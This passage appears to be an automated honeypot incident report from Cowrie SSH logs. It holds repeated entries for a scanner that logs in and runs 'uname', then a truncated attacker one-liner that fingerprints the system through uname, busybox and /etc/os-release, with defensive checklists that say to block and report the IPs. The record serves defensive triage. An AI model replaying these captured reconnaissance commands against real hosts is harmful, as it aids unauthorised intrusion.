| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 09:37:35` | `cowrie.session.connect` |
| `2026-07-26 09:37:35` | `cowrie.client.version` |
| `2026-07-26 09:37:35` | `cowrie.client.kex` |
| `2026-07-26 09:37:36` | `cowrie.login.success` |
| `2026-07-26 09:37:37` | `cowrie.session.params` |
| `2026-07-26 09:37:37` | `cowrie.command.input` |
| `2026-07-26 09:37:37` | `cowrie.log.closed` |
| `2026-07-26 09:37:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]53` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]53` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-296dd6756bc8

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]53` |
| **First Seen** | 2026-07-26 09:37 |
| **Last Seen** | 2026-07-26 09:37 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 09:37:40` | `cowrie.session.connect` |
| `2026-07-26 09:37:40` | `cowrie.client.version` |
| `2026-07-26 09:37:40` | `cowrie.client.kex` |
| `2026-07-26 09:37:41` | `cowrie.login.success` |
| `2026-07-26 09:37:41` | `cowrie.session.params` |
| `2026-07-26 09:37:41` | `cowrie.command.input` |
| `2026-07-26 09:37:41` | `cowrie.log.closed` |
| `2026-07-26 09:37:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]53` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]53` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-06b7bd348040

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]53` |
| **First Seen** | 2026-07-26 09:37 |
| **Last Seen** | 2026-07-26 09:37 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 09:37:45` | `cowrie.session.connect` |
| `2026-07-26 09:37:45` | `cowrie.client.version` |
| `2026-07-26 09:37:45` | `cowrie.client.kex` |
| `2026-07-26 09:37:45` | `cowrie.login.success` |
| `2026-07-26 09:37:47` | `cowrie.session.params` |
| `2026-07-26 09:37:47` | `cowrie.command.input` |
| `2026-07-26 09:37:47` | `cowrie.log.closed` |
| `2026-07-26 09:37:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]53` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]53` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6f75c0651c7c

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]53` |
| **First Seen** | 2026-07-26 09:37 |
| **Last Seen** | 2026-07-26 09:37 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 09:37:50` | `cowrie.session.connect` |
| `2026-07-26 09:37:50` | `cowrie.client.version` |
| `2026-07-26 09:37:50` | `cowrie.client.kex` |
| `2026-07-26 09:37:50` | `cowrie.login.success` |
| `2026-07-26 09:37:51` | `cowrie.session.params` |
| `2026-07-26 09:37:51` | `cowrie.command.input` |
| `2026-07-26 09:37:51` | `cowrie.log.closed` |
| `2026-07-26 09:37:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]53` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]53` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-863d4fa016ef

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]53` |
| **First Seen** | 2026-07-26 09:37 |
| **Last Seen** | 2026-07-26 09:37 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 09:37:55` | `cowrie.session.connect` |
| `2026-07-26 09:37:55` | `cowrie.client.version` |
| `2026-07-26 09:37:55` | `cowrie.client.kex` |
| `2026-07-26 09:37:55` | `cowrie.login.success` |
| `2026-07-26 09:37:56` | `cowrie.session.params` |
| `2026-07-26 09:37:56` | `cowrie.command.input` |
| `2026-07-26 09:37:56` | `cowrie.log.closed` |
| `2026-07-26 09:37:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]53` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]53` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e059c807a280

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]53` |
| **First Seen** | 2026-07-26 09:38 |
| **Last Seen** | 2026-07-26 09:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 09:38:00` | `cowrie.session.connect` |
| `2026-07-26 09:38:00` | `cowrie.client.version` |
| `2026-07-26 09:38:00` | `cowrie.client.kex` |
| `2026-07-26 09:38:00` | `cowrie.login.success` |
| `2026-07-26 09:38:01` | `cowrie.session.params` |
| `2026-07-26 09:38:01` | `cowrie.command.input` |
| `2026-07-26 09:38:01` | `cowrie.log.closed` |
| `2026-07-26 09:38:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]53` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]53` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ef1cb7306c82

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]53` |
| **First Seen** | 2026-07-26 09:38 |
| **Last Seen** | 2026-07-26 09:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 09:38:05` | `cowrie.session.connect` |
| `2026-07-26 09:38:05` | `cowrie.client.version` |
| `2026-07-26 09:38:05` | `cowrie.client.kex` |
| `2026-07-26 09:38:05` | `cowrie.login.success` |
| `2026-07-26 09:38:06` | `cowrie.session.params` |
| `2026-07-26 09:38:06` | `cowrie.command.input` |
| `2026-07-26 09:38:06` | `cowrie.log.closed` |
| `2026-07-26 09:38:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]53` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]53` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-42446c48d2e7

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]53` |
| **First Seen** | 2026-07-26 09:38 |
| **Last Seen** | 2026-07-26 09:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 09:38:10` | `cowrie.session.connect` |
| `2026-07-26 09:38:10` | `cowrie.client.version` |
| `2026-07-26 09:38:10` | `cowrie.client.kex` |
| `2026-07-26 09:38:10` | `cowrie.login.success` |
| `2026-07-26 09:38:11` | `cowrie.session.params` |
| `2026-07-26 09:38:11` | `cowrie.command.input` |
| `2026-07-26 09:38:11` | `cowrie.log.closed` |
| `2026-07-26 09:38:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]53` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]53` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5c7e0550ae5b

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]53` |
| **First Seen** | 2026-07-26 09:38 |
| **Last Seen** | 2026-07-26 09:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 09:38:14` | `cowrie.session.connect` |
| `2026-07-26 09:38:14` | `cowrie.client.version` |
| `2026-07-26 09:38:14` | `cowrie.client.kex` |
| `2026-07-26 09:38:14` | `cowrie.login.success` |
| `2026-07-26 09:38:15` | `cowrie.session.params` |
| `2026-07-26 09:38:15` | `cowrie.command.input` |
| `2026-07-26 09:38:15` | `cowrie.log.closed` |
| `2026-07-26 09:38:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]53` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]53` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-38fbab84f206

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]53` |
| **First Seen** | 2026-07-26 09:38 |
| **Last Seen** | 2026-07-26 09:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 09:38:18` | `cowrie.session.connect` |
| `2026-07-26 09:38:18` | `cowrie.client.version` |
| `2026-07-26 09:38:18` | `cowrie.client.kex` |
| `2026-07-26 09:38:19` | `cowrie.login.success` |
| `2026-07-26 09:38:19` | `cowrie.session.params` |
| `2026-07-26 09:38:19` | `cowrie.command.input` |
| `2026-07-26 09:38:20` | `cowrie.log.closed` |
| `2026-07-26 09:38:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]53` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]53` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bf766df6c652

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]53` |
| **First Seen** | 2026-07-26 09:38 |
| **Last Seen** | 2026-07-26 09:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 09:38:23` | `cowrie.session.connect` |
| `2026-07-26 09:38:23` | `cowrie.client.version` |
| `2026-07-26 09:38:23` | `cowrie.client.kex` |
| `2026-07-26 09:38:24` | `cowrie.login.success` |
| `2026-07-26 09:38:24` | `cowrie.session.params` |
| `2026-07-26 09:38:24` | `cowrie.command.input` |
| `2026-07-26 09:38:24` | `cowrie.log.closed` |
| `2026-07-26 09:38:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]53` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]53` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ed8fa871f667

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]53` |
| **First Seen** | 2026-07-26 09:38 |
| **Last Seen** | 2026-07-26 09:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 09:38:28` | `cowrie.session.connect` |
| `2026-07-26 09:38:28` | `cowrie.client.version` |
| `2026-07-26 09:38:28` | `cowrie.client.kex` |
| `2026-07-26 09:38:29` | `cowrie.login.success` |
| `2026-07-26 09:38:30` | `cowrie.session.params` |
| `2026-07-26 09:38:30` | `cowrie.command.input` |
| `2026-07-26 09:38:30` | `cowrie.log.closed` |
| `2026-07-26 09:38:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]53` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]53` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-27c51b4e4349

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]53` |
| **First Seen** | 2026-07-26 09:38 |
| **Last Seen** | 2026-07-26 09:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 09:38:34` | `cowrie.session.connect` |
| `2026-07-26 09:38:34` | `cowrie.client.version` |
| `2026-07-26 09:38:34` | `cowrie.client.kex` |
| `2026-07-26 09:38:34` | `cowrie.login.success` |
| `2026-07-26 09:38:35` | `cowrie.session.params` |
| `2026-07-26 09:38:35` | `cowrie.command.input` |
| `2026-07-26 09:38:35` | `cowrie.log.closed` |
| `2026-07-26 09:38:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]53` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]53` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-644f17dba34a

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]53` |
| **First Seen** | 2026-07-26 09:38 |
| **Last Seen** | 2026-07-26 09:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 09:38:39` | `cowrie.session.connect` |
| `2026-07-26 09:38:39` | `cowrie.client.version` |
| `2026-07-26 09:38:39` | `cowrie.client.kex` |
| `2026-07-26 09:38:39` | `cowrie.login.success` |
| `2026-07-26 09:38:40` | `cowrie.session.params` |
| `2026-07-26 09:38:40` | `cowrie.command.input` |
| `2026-07-26 09:38:40` | `cowrie.log.closed` |
| `2026-07-26 09:38:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]53` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]53` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-50b02cb377e9

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]53` |
| **First Seen** | 2026-07-26 09:38 |
| **Last Seen** | 2026-07-26 09:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 09:38:44` | `cowrie.session.connect` |
| `2026-07-26 09:38:44` | `cowrie.client.version` |
| `2026-07-26 09:38:44` | `cowrie.client.kex` |
| `2026-07-26 09:38:44` | `cowrie.login.success` |
| `2026-07-26 09:38:45` | `cowrie.session.params` |
| `2026-07-26 09:38:45` | `cowrie.command.input` |
| `2026-07-26 09:38:45` | `cowrie.log.closed` |
| `2026-07-26 09:38:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]53` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]53` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-02957ee52864

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]53` |
| **First Seen** | 2026-07-26 09:38 |
| **Last Seen** | 2026-07-26 09:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 09:38:49` | `cowrie.session.connect` |
| `2026-07-26 09:38:49` | `cowrie.client.version` |
| `2026-07-26 09:38:49` | `cowrie.client.kex` |
| `2026-07-26 09:38:49` | `cowrie.login.success` |
| `2026-07-26 09:38:50` | `cowrie.session.params` |
| `2026-07-26 09:38:50` | `cowrie.command.input` |
| `2026-07-26 09:38:50` | `cowrie.log.closed` |
| `2026-07-26 09:38:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]53` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]53` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-969271362eea

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]53` |
| **First Seen** | 2026-07-26 09:38 |
| **Last Seen** | 2026-07-26 09:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 09:38:53` | `cowrie.session.connect` |
| `2026-07-26 09:38:53` | `cowrie.client.version` |
| `2026-07-26 09:38:54` | `cowrie.client.kex` |
| `2026-07-26 09:38:54` | `cowrie.login.success` |
| `2026-07-26 09:38:55` | `cowrie.session.params` |
| `2026-07-26 09:38:55` | `cowrie.command.input` |
| `2026-07-26 09:38:55` | `cowrie.log.closed` |
| `2026-07-26 09:38:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]53` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]53` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9fe2c98aa0f0

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]53` |
| **First Seen** | 2026-07-26 09:38 |
| **Last Seen** | 2026-07-26 09:39 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 09:38:59` | `cowrie.session.connect` |
| `2026-07-26 09:38:59` | `cowrie.client.version` |
| `2026-07-26 09:38:59` | `cowrie.client.kex` |
| `2026-07-26 09:38:59` | `cowrie.login.success` |
| `2026-07-26 09:39:00` | `cowrie.session.params` |
| `2026-07-26 09:39:00` | `cowrie.command.input` |
| `2026-07-26 09:39:00` | `cowrie.log.closed` |
| `2026-07-26 09:39:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]53` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]53` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fcfebc489506

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]53` |
| **First Seen** | 2026-07-26 09:39 |
| **Last Seen** | 2026-07-26 09:39 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 09:39:03` | `cowrie.session.connect` |
| `2026-07-26 09:39:03` | `cowrie.client.version` |
| `2026-07-26 09:39:04` | `cowrie.client.kex` |
| `2026-07-26 09:39:04` | `cowrie.login.success` |
| `2026-07-26 09:39:05` | `cowrie.session.params` |
| `2026-07-26 09:39:05` | `cowrie.command.input` |
| `2026-07-26 09:39:05` | `cowrie.log.closed` |
| `2026-07-26 09:39:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]53` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]53` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5ceec9d9125a

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]53` |
| **First Seen** | 2026-07-26 09:39 |
| **Last Seen** | 2026-07-26 09:39 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 09:39:08` | `cowrie.session.connect` |
| `2026-07-26 09:39:08` | `cowrie.client.version` |
| `2026-07-26 09:39:08` | `cowrie.client.kex` |
| `2026-07-26 09:39:09` | `cowrie.login.success` |
| `2026-07-26 09:39:10` | `cowrie.session.params` |
| `2026-07-26 09:39:10` | `cowrie.command.input` |
| `2026-07-26 09:39:10` | `cowrie.log.closed` |
| `2026-07-26 09:39:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]53` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]53` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-06480ef13483

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]53` |
| **First Seen** | 2026-07-26 09:39 |
| **Last Seen** | 2026-07-26 09:39 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 09:39:13` | `cowrie.session.connect` |
| `2026-07-26 09:39:13` | `cowrie.client.version` |
| `2026-07-26 09:39:13` | `cowrie.client.kex` |
| `2026-07-26 09:39:14` | `cowrie.login.success` |
| `2026-07-26 09:39:15` | `cowrie.session.params` |
| `2026-07-26 09:39:15` | `cowrie.command.input` |
| `2026-07-26 09:39:15` | `cowrie.log.closed` |
| `2026-07-26 09:39:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]53` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]53` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-272fccfd9c97

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]53` |
| **First Seen** | 2026-07-26 09:39 |
| **Last Seen** | 2026-07-26 09:39 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 09:39:18` | `cowrie.session.connect` |
| `2026-07-26 09:39:18` | `cowrie.client.version` |
| `2026-07-26 09:39:18` | `cowrie.client.kex` |
| `2026-07-26 09:39:19` | `cowrie.login.success` |
| `2026-07-26 09:39:20` | `cowrie.session.params` |
| `2026-07-26 09:39:20` | `cowrie.command.input` |
| `2026-07-26 09:39:20` | `cowrie.log.closed` |
| `2026-07-26 09:39:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]53` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]53` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0de1732fe7e2

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]53` |
| **First Seen** | 2026-07-26 09:39 |
| **Last Seen** | 2026-07-26 09:39 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 09:39:23` | `cowrie.session.connect` |
| `2026-07-26 09:39:23` | `cowrie.client.version` |
| `2026-07-26 09:39:23` | `cowrie.client.kex` |
| `2026-07-26 09:39:24` | `cowrie.login.success` |
| `2026-07-26 09:39:25` | `cowrie.session.params` |
| `2026-07-26 09:39:25` | `cowrie.command.input` |
| `2026-07-26 09:39:25` | `cowrie.log.closed` |
| `2026-07-26 09:39:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]53` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]53` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-95d11cd60b33

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]53` |
| **First Seen** | 2026-07-26 09:39 |
| **Last Seen** | 2026-07-26 09:39 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 09:39:28` | `cowrie.session.connect` |
| `2026-07-26 09:39:28` | `cowrie.client.version` |
| `2026-07-26 09:39:28` | `cowrie.client.kex` |
| `2026-07-26 09:39:29` | `cowrie.login.success` |
| `2026-07-26 09:39:30` | `cowrie.session.params` |
| `2026-07-26 09:39:30` | `cowrie.command.input` |
| `2026-07-26 09:39:30` | `cowrie.log.closed` |
| `2026-07-26 09:39:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]53` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]53` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e4f341407e7a

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]168` |
| **First Seen** | 2026-07-26 09:39 |
| **Last Seen** | 2026-07-26 09:39 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 09:39:30` | `cowrie.session.connect` |
| `2026-07-26 09:39:31` | `cowrie.client.version` |
| `2026-07-26 09:39:31` | `cowrie.client.kex` |
| `2026-07-26 09:39:35` | `cowrie.login.success` |
| `2026-07-26 09:39:38` | `cowrie.session.params` |
| `2026-07-26 09:39:38` | `cowrie.command.input` |
| `2026-07-26 09:39:38` | `cowrie.command.input` |
| `2026-07-26 09:39:38` | `cowrie.command.input` |
| `2026-07-26 09:39:38` | `cowrie.command.input` |
| `2026-07-26 09:39:38` | `cowrie.command.input` |
| `2026-07-26 09:39:38` | `cowrie.command.success` |
| `2026-07-26 09:39:38` | `cowrie.command.input` |
| `2026-07-26 09:39:38` | `cowrie.command.input` |
| `2026-07-26 09:39:38` | `cowrie.command.input` |
| `2026-07-26 09:39:38` | `cowrie.command.input` |
| `2026-07-26 09:39:39` | `cowrie.log.closed` |
| `2026-07-26 09:39:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]168` to AbuseIPDB if not already reported
